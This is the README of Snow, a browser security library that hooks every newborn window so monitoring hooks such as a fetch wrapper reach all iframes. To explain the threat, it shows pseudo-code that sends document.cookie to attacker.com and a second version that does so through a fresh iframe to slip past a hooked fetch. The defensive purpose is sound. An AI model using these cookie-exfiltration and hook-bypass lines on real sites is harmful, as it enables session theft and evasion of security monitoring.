# Snow ❄️

> **S**ecuring **N**ested **O**wnership of **W**indows

`Snow` aspires to standardize how to recursively own newborn windows within a browser webpage,
from the context of the webpage itself.

* *Read this on [github wiki](https://github.com/weizman/snow/wiki/)* 📖 , *browse source code [repo](https://github.com/weizman/snow)* 👨‍💻

With `Snow` you can for the first time manipulate any new window that comes to life
within the webpage, and by that can determine how windows will be installed when created.

Here's why this is important, and why this was never solved before:

* [The Evolution of Code Execution in Websites](#the-evolution-of-code-execution-in-websites)
* [The iFrames Headache](#the-iframes-headache)
* [Snow](#snow)
* [Why snow solves a non trivial problem](#why-snow-solves-a-non-trivial-problem)
   * [inserters](#inserters)
   * [listeners](#listeners)
   * [attributes](#attributes)
   * [html](#html)
   * [open](#open)
   * [natives](#natives)
* [Contribute](#contribute)
   * [Support](#support)
   * [Performance](#performance)
   * [Security](#security)
   * [Tests](#tests)
   * [Help](#help)

## The Evolution of Code Execution in Websites

The web security space has grown a lot in the past years, and lately faces a
new and improved version of a traditional problem - unwanted code execution in websites.

Back then, the problem occurred mostly due to code execution
allowing vulnerabilities, such as [XSS](https://owasp.org/www-community/attacks/xss/), that were widely popular and approachable for attackers.

Such vulnerabilities allowed attackers to achieve [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) under vulnerable websites.

These issues were addressed in various ways such as the famous [CSP](https://content-security-policy.com/) mechanizm,
but the web security industry later learned that such solutions were
insufficient for addressing the problem, especially due to the
evolution of the unwanted code execution problem, such as the [supply chain attacks]().

The supply chain attacks problem became more serious lately since the mass
adoption of third party libraries based development.

Essentially it means that an attacker no longer has to break down the main website in order to obtain code execution -
hacking (or delivering) a specific third party library that is being used by the website can achieve a similar impact.

Now this step of the evolution brings us to a point where CSP can't necessarily help us address the issue.  
In the vulnerability disclosure article I wrote
[Chromium Based Browsers Full CSP Bypass Zero Day (CVE-2020-6519)](https://weizman.github.io/?csp-bypass-vul)
I talk more about why is that.

So web security companies who saw that coming, began working on client side based solutions, by providing better
monitoring tools for javascript activity in the browser.

The approach in general is "we can offer a javascript third party library that once installed
in the website, monitors the activity of the different code that is being executed, and later on we can tell
which of these activities were illegitimate, if any".

The idea of monitoring javascript activity in the website is accomplished by hooking (overriding) functions that
are considered by the solution provider as "sensitive".

So for example, we can tell for sure that no matter what the attacker wishes to accomplish by executing javascript code
in the website, they would probably want to exfiltrate the result of
their execution somehow (e.g. stealing cookies and then sending them to your evil server):

```javascript
// pseudo code
window.fetch('https://attacker.com/stolen-cookies?data=' + document.cookie);
```

So naturally, hooking `window.fetch` function is a good idea, because when the attacker uses `fetch` API to exfiltrate
the stolen data, the hook can monitor the action and catch the malicious activity in action:

```javascript
// pseudo code
const realFetch = window.fetch;
window.fetch = function(input, init) {
    console.log('attempt to use fetch API with the following arguments: ', input, init);
    return realFetch.call(this, input, init);
}
```

This technique is well known in the web security industry, as it serves correct implementations of similar security solutions.
This technique serves not only security solutions, but many other industries too.

You can use this technique to create and offer third party javascript libraries that:
* hook all network communication attempts, log them and present them to the customer (e.g. [logrocket](https://logrocket.com/));
* track user activity and provide the collected data as a service to the customer (e.g. [convizit](https://convizit.com/));
* hook and monitor sensitive functions in the browser that might uncover malicious unwanted activity in the website (e.g. [perimeterx](https://perimeterx.com/));

**But they're all lacking an important component in their solutions, especially the web security ones,
which allows attackers to easily bypass them and effectively cancel their solution entirely**

## The iFrames Headache

considering the fetch API example from above, let's assume an attacker gains a code execution on a website,
and after they stole some cookies, they want to exfiltrate the stolen data back to their servers.
On first thought, this might not seem as an easy task, now that `window.fetch` is hooked and being monitored.

Lucky (for the attacker) we can use the power of iframes.

I mean after all, every window that comes to life within the webpage has its own APIs initialized, including fetch API.
So instead of using the top window's fetch API (which is hooked), an attacker can simply create a new window
by appending to the DOM a new `iframe` element and then use its window's fetch API:

```javascript
// pseudo code
const ifr = document.createElement('iframe');
ifr.src = 'about:blank'; // to maintain same origin policy between the top window and the new iframe window
document.head.appendChild(ifr);
const iframeWindow = ifr.contentWindow;
iframeWindow.fetch('https://attacker.com/stolen-cookies?data=' + document.cookie);
```

We learn here, that hooking the top window's fetch API is simply not
enough - **we have to do so for every window that might exist in the webpage**.

In order to do so, we'd have to successfully face a few challenges:
1. map every single way of initiating a new window within a webpage
2. hook each of those ways to give us every "newborn" window the second
   it is created and before its creator can have their hands on it

Once we know how to do that, **we can start applying our monitoring fetch
API hook on every new window in the webpage - and not just the top window.**

## Snow

This problem is partly solved by some companies that implemented non-fully-hermetic solutions
to meet their specific needs.

**However, there is no public and hermetic solution that aspires
to serve as a standard solution to this problem, a solution that covers all possible
scenarios and promises full control on every new window in the webpage.** (no private
solution either in my opinion, but I can't commit to that statement)

That's what `snow` comes to solve - it is a simple js library with a very simple API
that by giving a callback makes sure to execute it on every window that is initiated in the
webpage before its creator gets to manipulate it.

So considering again the example from above, with `snow` you can protect fetch API
once and for all:

```javascript
window.SNOW((win) => {
  const realFetch = win.fetch;
  win.fetch = function(input, init) {
    console.log('attempt to use fetch API with the following arguments: ', input, init);
    return realFetch.call(this, input, init);
  }
}, window);
```

This will make sure to hook fetch API on every new window in the webpage!

## Why snow solves a non trivial problem

implementing `snow` is not a trivial thing to do mostly due to the necessity of the
solution being hermetic.

In order for it to fully work, all possible ways of creating new windows in the webpage
must be hooked and taken care of, so there won't be any holes for attackers to exploit.

Meaning, if there's even a single way for attackers to create a new window without going through
`snow`, then as said earlier - the whole idea is canceled.

Either there's no way, or there's no solution.

Here's how it's done:

### inserters

First method of creating a new window is to create a frame element and insert it to the DOM:

```javascript
const ifr = document.createElement('iframe');
ifr.src = 'about:blank';
document.head.appendChild(ifr);
const iframeWindow = ifr.contentWindow;
iframeWindow.alert(iframeWindow !== window.top);
```

handling inserters is rather simple, we simply overwrite the insertions APIs under the window
to take care of a newborn window within it before passing it on to its creator (see [inserters.js](https://github.com/weizman/snow/blob/main/src/inserters.js))

### listeners

Hooking inserters is not enough, because in chromium based browsers, a frame's load event listener
is called synchronously when is being inserted into the DOM, meaning the load event listener
will be called before the inserter hook is called, which leaves an attacker the option to manipulate
the newborn window before our inserter hook has a chance:

```javascript
const ifr = document.createElement('iframe');
ifr.src = 'about:blank';
ifr.addEventListener('load', (e) => {
  const iframeWindow = ifr.contentWindow;
  iframeWindow.alert(iframeWindow !== window.top);
})
document.head.appendChild(ifr);
```

solution is similar as before, hook it as well (see [listeners.js](https://github.com/weizman/snow/blob/main/src/listeners.js))

### attributes

Adding an event listener to an element can be done via attributes,
and not only `addEventListener` API, so that also must be taken care of:

```javascript
const ifr = document.createElement('iframe');
ifr.src = 'about:blank';
ifr.onload = (e) => {
  const iframeWindow = ifr.contentWindow;
  iframeWindow.alert(iframeWindow !== window.top);
};
document.head.appendChild(ifr);
```
or
```javascript
const ifr = document.createElement('iframe');
ifr.src = 'about:blank';
ifr.setAttribute('onload', (e) => {
  const iframeWindow = ifr.contentWindow;
  iframeWindow.alert(iframeWindow !== window.top);
});
document.head.appendChild(ifr);
```

What we do here, is to strip down any load attributes and channel them through the
mentioned above listeners hook, so we don't harm the original intention of attaching some
load event listener to the element. (see [attributes.js](https://github.com/weizman/snow/blob/main/src/attributes.js))

### html

Now this is a tricky one. DOM manipulation can be done by DOM string representation and not only
DOM elements insertion:

```javascript
document.head.innerHTML += `<iframe onload="alert(this.window !== window.top)"></iframe>`;
```

This is much harder to hook, because realizing there's a frame hidden in that
string can be very tricky. The idea here is to turn that html string into an actual
DOM tree, strip down any onload attributes that might be used to manipulate that frame,
and then right after letting the real call modify the real DOM - take that newborn window
and hook it as well (see [html.js](https://github.com/weizman/snow/blob/main/src/html.js)).

### open

This one is simple. Anyone can create a new window by simply calling `open` API:

```javascript
open("").alert.call(window, this.window !== window.top);
```

Hooking that is very straight forward, simply handle the new window
that is born out of this action before returning it (see [open.js](https://github.com/weizman/snow/blob/main/src/open.js)).

### natives

This is a very important and the most unique part of the hermetic concept (and this
is why you see weird `natives[...]` all over the code).
It comes down to the understanding that protecting window initializing APIs must be done
in a protected way!

This is a concept that is hard to explain without diving deep into it, but the bottom line is
that we want to assure our protecting hooks use APIs safely that cannot be tampered and
interfered by anyone from outside.

So for example, if our `document.appendChild` hook uses for some reason `Array.prototype.slice`
API, we must make sure the API we use cannot be hooked by an attacker, otherwise they can
cancel our protection while its being executed.

This is done by using a technique called `natives management` -
learn more about it by seeing [natives.js](https://github.com/weizman/snow/blob/main/src/natives.js).

## Is it production ready?

Even though the hard part of proving this is fully possible and fully secure is done, There
are still some reasons why `Snow` is not production ready:

1. Browsers Support - All efforts went toward making sure `Snow` works smoothly with no errors on Chromium
based browsers, it was not tested on Firefox/Safari. Help with applying support in these to this
project is needed.
2. Performance - Currently, in order for 
Snow to remain fully secure, it harms the performance significantly. This is something
that the Snow project can use a lot of help with, but until then, Snow harms the 
performance in some websites (there will be however a version of `Snow` for extensions 
that will cut performance almost entirely, but it will serve extension products only)
3. Security - `Snow` is worthless if it's not fully secure. What mainly lead this project was to make sure
it is hermetically secured, so it is very safe to use. 
However, this project is new and any help on the security side will be much appreciated!

### Reach out!

Can you help with any of the above? Do you have any insights on possible solutions? 
Want me to focus on specific aspects of this project? feel free to reach out in any way.
Feedback or any help are highly appreciated!

I hope you'd find `Snow` as exciting as I do :)
